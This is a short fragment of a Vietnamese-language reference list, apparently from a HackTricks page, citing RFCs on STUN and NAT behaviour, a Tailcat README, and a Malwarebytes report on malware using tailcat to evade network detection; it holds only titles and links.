- [60] [RFC 8489 - Các tiện ích duyệt phiên cho NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Yêu cầu hành vi của NAT đối với UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README của Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Malware Kothamine dùng tailcat của Tailscale để né tránh phát hiện trên mạng](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
